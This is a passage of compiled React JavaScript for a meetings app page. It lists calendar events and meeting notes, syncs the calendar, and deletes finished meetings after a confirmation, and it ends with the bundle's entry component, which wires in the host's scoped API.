							placeholder: i18nT("apps.meetings.settings.correctPlaceholder"),
							"aria-label": i18nT("apps.meetings.settings.correctLabel"),
							...ime.bindEnter({ onEnter: submitTerm })
						}),
						/* @__PURE__ */ jsxs(SendBtn, {
							onClick: submitTerm,
							"aria-label": i18nT("apps.meetings.settings.addTerm"),
							children: [/* @__PURE__ */ jsx(Plus, { className: "lucide-inline" }), i18nT("apps.meetings.settings.addTerm")]
						})
					]
				})
			] })
		]
	})] });
}
// src/MeetingsPage.tsx
var LIVE_STATUSES = /* @__PURE__ */ new Set([
	"active",
	"paused",
	"reviewing"
]);
function deleteFailureMessage(error) {
	return error instanceof Error && error.message.trim() ? error.message : i18nT("apps.meetings.list.deleteFailed");
}
function mergeRows(events, meetings) {
	const byId = /* @__PURE__ */ new Map();
	for (const event of events) byId.set(safeMeetingId(event.event_id), {
		eventId: event.event_id,
		title: event.title,
		start: event.start,
		end: event.end,
		allDay: event.all_day,
		status: "scheduled",
		touched: false
	});
	for (const meeting of meetings) {
		const key = safeMeetingId(meeting.event_id);
		const existing = byId.get(key);
		byId.set(key, {
			eventId: meeting.event_id,
			title: meeting.title || existing?.title || i18nT("apps.meetings.session.untitled"),
			start: existing?.start ?? meeting.started_at,
			end: existing?.end ?? meeting.ended_at,
			allDay: existing?.allDay ?? false,
			status: meeting.status,
			touched: true
		});
	}
	return [...byId.values()].sort((a, b) => {
		const [x, y] = [a.start || "", b.start || ""];
		return x === y ? 0 : x < y ? 1 : -1;
	});
}
function formatWhen(row) {
	if (!row.start) return "";
	const start = new Date(row.start);
	if (Number.isNaN(start.getTime())) return "";
	if (row.allDay) return fmtDateFields(start, {
		weekday: "short",
		month: "short",
		day: "numeric",
		timeZone: "UTC"
	});
	return `${fmtDateFields(start, {
		weekday: "short",
		month: "short",
		day: "numeric"
	})} · ${fmtDateFields(start, {
		hour: "2-digit",
		minute: "2-digit"
	})}`;
}
/**
* The notifier for this page: the SDK's `useNotify()`. An installed app's page
* runs inside the host's scoped-API layer, which is what that hook reads.
*/
function useNotifier() {
	return useNotify();
}
/** How often the list re-reads the calendar cache and the meetings on disk. */
var LIST_REFRESH_MS = 6e4;
function MeetingsPage() {
	const notify = useNotifier();
	const queryClient = useQueryClient();
	const [route, setRoute] = useState({ view: "list" });
	const [filter, setFilter] = useState("");
	const configQuery = useQuery({
		queryKey: ["meetings", "config"],
		queryFn: meetingsApi.config
	});
	const calendarQuery = useQuery({
		queryKey: ["meetings", "calendar"],
		queryFn: meetingsApi.calendar,
		refetchInterval: LIST_REFRESH_MS
	});
	const meetingsQuery = useQuery({
		queryKey: ["meetings", "list"],
		queryFn: meetingsApi.meetings,
		refetchInterval: LIST_REFRESH_MS
	});
	const sync = useMutation({
		mutationFn: meetingsApi.syncCalendar,
		onSuccess: (response) => {
			notify(i18nT("apps.meetings.list.synced", { count: response.count }), { type: "success" });
			queryClient.invalidateQueries({ queryKey: ["meetings", "calendar"] });
		},
		onError: (error) => notify(error.message || i18nT("apps.meetings.list.syncFailed"), { type: "error" })
	});
	const deleteMeeting = useMutation({
		mutationFn: ({ eventId }) => meetingsApi.deleteMeeting(eventId),
		onSuccess: (_response, { eventId, title }) => {
			notify(i18nT("apps.meetings.list.deleted", { title }), { type: "success" });
			queryClient.removeQueries({ queryKey: ["meetings", safeMeetingId(eventId)] });
			queryClient.invalidateQueries({ queryKey: ["meetings", "list"] });
		},
		onError: (error) => notify(deleteFailureMessage(error), { type: "error" })
	});
	const rows = useMemo(() => mergeRows(calendarQuery.data?.events ?? [], meetingsQuery.data?.meetings ?? []), [calendarQuery.data, meetingsQuery.data]);
	const filtered = useMemo(() => {
		const query = filter.trim().toLowerCase();
		return query ? rows.filter((row) => row.title.toLowerCase().includes(query)) : rows;
	}, [rows, filter]);
	const liveRow = rows.find((row) => row.status === "active" || row.status === "reviewing");
	if (route.view === "meeting") return /* @__PURE__ */ jsx(MeetingView, {
		eventId: route.eventId,
		fallbackTitle: route.title,
		config: configQuery.data?.config,
		onBack: () => {
			setRoute({ view: "list" });
			queryClient.invalidateQueries({ queryKey: ["meetings", "list"] });
		},
		onOpenSettings: () => setRoute({ view: "settings" }),
		notify
	});
	if (route.view === "settings") return /* @__PURE__ */ jsx(SettingsView, {
		onBack: () => setRoute({ view: "list" }),
		notify
	});
	const startAdHoc = () => {
		const eventId = `adhoc-${(/* @__PURE__ */ new Date()).toISOString().replace(/[:.]/g, "-")}`;
		setRoute({
			view: "meeting",
			eventId,
			title: i18nT("apps.meetings.list.adHocTitle")
		});
	};
	const requestDelete = (event, row) => {
		event.stopPropagation();
		if (window.confirm(i18nT("apps.meetings.list.deleteConfirm", { title: row.title }))) deleteMeeting.mutate({
			eventId: row.eventId,
			title: row.title
		});
	};
	return /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx(PageHeader, {
		title: i18nT("apps.meetings.list.title"),
		subtitle: i18nT("apps.meetings.list.subtitle"),
		actions: /* @__PURE__ */ jsxs(Fragment$1, { children: [
			/* @__PURE__ */ jsxs(Btn$1, {
				onClick: () => sync.mutate(),
				disabled: sync.isPending,
				"aria-label": i18nT("apps.meetings.list.syncCalendar"),
				children: [/* @__PURE__ */ jsx(RefreshCw, { className: `lucide-inline ${sync.isPending ? "animate-spin" : ""}` }), i18nT("apps.meetings.list.syncCalendar")]
			}),
			/* @__PURE__ */ jsxs(Btn$1, {
				onClick: () => setRoute({ view: "settings" }),
				"aria-label": i18nT("apps.meetings.list.settings"),
				children: [/* @__PURE__ */ jsx(Settings2, { className: "lucide-inline" }), i18nT("apps.meetings.list.settings")]
			}),
			/* @__PURE__ */ jsxs(Btn$1, {
				primary: true,
				onClick: startAdHoc,
				"aria-label": i18nT("apps.meetings.list.newMeeting"),
				children: [/* @__PURE__ */ jsx(CalendarPlus, { className: "lucide-inline" }), i18nT("apps.meetings.list.newMeeting")]
			})
		] })
	}), /* @__PURE__ */ jsxs("div", {
		className: "px-4 md:px-6 pb-8 overflow-y-auto flex-1 min-h-0",
		children: [
			sync.isError && /* @__PURE__ */ jsx(ui_default$2, {
				message: sync.error.message || i18nT("apps.meetings.list.syncFailed"),
				askAgent: true,
				onDismiss: () => sync.reset(),
				className: "mt-4"
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "grid gap-3.5 grid-cols-[repeat(auto-fit,minmax(150px,1fr))] my-6",
				children: [
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.meetings.list.statScheduled"),
						value: rows.filter((row) => row.status === "scheduled").length,
						accent: true
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.meetings.list.statWorked"),
						value: rows.filter((row) => row.touched).length
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.meetings.list.statLive"),
						value: rows.filter((row) => row.status === "active").length
					})
				]
			}),
			liveRow && /* @__PURE__ */ jsx(Card, {
				className: "mb-4 border-ok/40",
				children: /* @__PURE__ */ jsxs("div", {
					className: "flex items-center justify-between gap-3",
					children: [/* @__PURE__ */ jsxs("span", {
						className: "text-sm text-text inline-flex items-center gap-2",
						children: [/* @__PURE__ */ jsx(CircleDot, { className: "lucide-inline text-ok" }), liveRow.status === "reviewing" ? i18nT("apps.meetings.list.reviewingBanner", { title: liveRow.title }) : i18nT("apps.meetings.list.liveBanner", { title: liveRow.title })]
					}), /* @__PURE__ */ jsx(Btn$1, {
						primary: true,
						onClick: () => setRoute({
							view: "meeting",
							eventId: liveRow.eventId,
							title: liveRow.title
						}),
						children: i18nT("apps.meetings.list.returnToMeeting")
					})]
				})
			}),
			/* @__PURE__ */ jsxs(Card, { children: [
				/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.list.sectionTitle") }),
				/* @__PURE__ */ jsx(SearchInput, {
					className: "my-3",
					placeholder: i18nT("apps.meetings.list.filterPlaceholder"),
					"aria-label": i18nT("apps.meetings.list.filterPlaceholder"),
					value: filter,
					onChange: (e) => setFilter(e.target.value)
				}),
				calendarQuery.isLoading || meetingsQuery.isLoading ? /* @__PURE__ */ jsx(Skeleton, { className: "h-24" }) : filtered.length === 0 ? /* @__PURE__ */ jsx(EmptyState, {
					icon: /* @__PURE__ */ jsx(CalendarClock, { className: "lucide-inline" }),
					title: i18nT("apps.meetings.list.empty"),
					subtitle: calendarQuery.data?.configured ? i18nT("apps.meetings.list.emptyHintSynced") : i18nT("apps.meetings.list.emptyHintNoCalendar")
				}) : /* @__PURE__ */ jsx("div", {
					className: "flex flex-col gap-2",
					children: filtered.map((row) => {
						const rowDeleteError = deleteMeeting.isError && deleteMeeting.variables?.eventId === row.eventId ? deleteFailureMessage(deleteMeeting.error) : "";
						return /* @__PURE__ */ jsxs("div", {
							className: "flex flex-col gap-1",
							children: [/* @__PURE__ */ jsxs(ui_default$1, {
								onClick: () => setRoute({
									view: "meeting",
									eventId: row.eventId,
									title: row.title
								}),
								className: "flex items-center gap-3 px-4 py-3 border border-border rounded-md cursor-pointer hover:border-border-strong transition-colors",
								children: [
									/* @__PURE__ */ jsxs("div", {
										className: "flex-1 min-w-0",
										children: [/* @__PURE__ */ jsx("div", {
											className: "text-sm text-text font-medium truncate",
											children: row.title
										}), formatWhen(row) && /* @__PURE__ */ jsx("div", {
											className: "text-[12px] text-muted font-mono",
											children: formatWhen(row)
										})]
									}),
									row.status === "active" && /* @__PURE__ */ jsx(Badge, {
										variant: "ok",
										children: i18nT("apps.meetings.meeting.live")
									}),
									row.status === "reviewing" && /* @__PURE__ */ jsx(Badge, {
										variant: "warn",
										children: i18nT("apps.meetings.list.reviewing")
									}),
									row.status === "paused" && /* @__PURE__ */ jsx(Badge, {
										variant: "warn",
										children: i18nT("apps.meetings.meeting.paused")
									}),
									row.status === "ended" && /* @__PURE__ */ jsx(Badge, {
										variant: "muted",
										children: i18nT("apps.meetings.meeting.ended")
									}),
									row.touched && /* @__PURE__ */ jsx(FileText, {
										className: "lucide-inline text-muted",
										"aria-label": i18nT("apps.meetings.list.hasNotes")
									}),
									row.touched && /* @__PURE__ */ jsx(IconButton, {
										variant: "danger",
										className: "shrink-0 inline-flex items-center justify-center",
										disabled: deleteMeeting.isPending || LIVE_STATUSES.has(row.status),
										title: LIVE_STATUSES.has(row.status) ? i18nT("apps.meetings.list.deleteUnavailable") : i18nT("apps.meetings.list.deleteMeeting", { title: row.title }),
										"aria-label": LIVE_STATUSES.has(row.status) ? i18nT("apps.meetings.list.deleteUnavailable") : i18nT("apps.meetings.list.deleteMeeting", { title: row.title }),
										onClick: (event) => requestDelete(event, row),
										children: deleteMeeting.isPending && deleteMeeting.variables?.eventId === row.eventId ? /* @__PURE__ */ jsx(Loader2, {
											className: "lucide-inline animate-spin motion-reduce:animate-none",
											"aria-hidden": "true"
										}) : /* @__PURE__ */ jsx(Trash2, {
											className: "lucide-inline",
											"aria-hidden": "true"
										})
									})
								]
							}), /* @__PURE__ */ jsx(ui_default$2, {
								message: rowDeleteError,
								askAgent: true,
								className: "animate-rise"
							})]
						}, row.eventId);
					})
				})
			] })
		]
	})] });
}
// src/index.tsx
/**
* The bundle's entry: AppHost lazy-imports this module and renders its default
* export as the app's page.
*
* Two things happen here once, for the whole page. The host's permission-scoped
* API client becomes the transport every Meetings call goes through
* (`api.setTransport`), and the host's language generation is subscribed to,
* which repaints the page on a language switch: `t` reads the active locale at
* call time, and this component's re-render reaches every child.
*/
function MeetingsApp() {
	useLanguageGeneration();
	setTransport(useAppApi());
	return /* @__PURE__ */ jsx("div", {
		className: "flex flex-col flex-1 min-h-0 h-full",
		children: /* @__PURE__ */ jsx(MeetingsPage, {})
	});
}
export { MeetingsApp as default };
